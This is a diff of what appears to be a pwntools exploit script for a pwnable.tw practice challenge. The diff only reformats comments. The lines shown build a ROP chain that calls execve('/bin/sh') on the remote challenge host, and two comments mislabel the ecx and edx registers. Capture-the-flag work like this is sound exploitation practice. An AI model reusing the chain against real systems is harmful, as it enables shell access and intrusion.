@@ -29,14 +29,14 @@ def offset_binsh():
 sh = remote("chall.pwnable.tw", 10100)
 sh.recvline()
 # execve(path='/bin/sh', argv=0, envp=0)
-rop_chain("+361", 0x805c34b)        # pop eax; ret
-rop_chain("+362", 11)               # eax = 11
-rop_chain("+363", 0x80701aa)        # pop edx; ret
-rop_chain("+364", 0)                # ecx = 0
-rop_chain("+365", 0x80701d1)        # pop ecx; pop ebx; ret
-rop_chain("+366", 0)                # edx = 0
-rop_chain("+367", offset_binsh())   # "/bin/sh\x00"
-rop_chain("+368", 0x8049a21)        # int 0x80
+rop_chain("+361", 0x805c34b)  # pop eax; ret
+rop_chain("+362", 11)  # eax = 11
+rop_chain("+363", 0x80701aa)  # pop edx; ret
+rop_chain("+364", 0)  # ecx = 0
+rop_chain("+365", 0x80701d1)  # pop ecx; pop ebx; ret
+rop_chain("+366", 0)  # edx = 0
+rop_chain("+367", offset_binsh())  # "/bin/sh\x00"
+rop_chain("+368", 0x8049a21)  # int 0x80
 rop_chain("+369", u32("/bin"))
 rop_chain("+370", u32("/sh\x00"))
 sh.sendline()
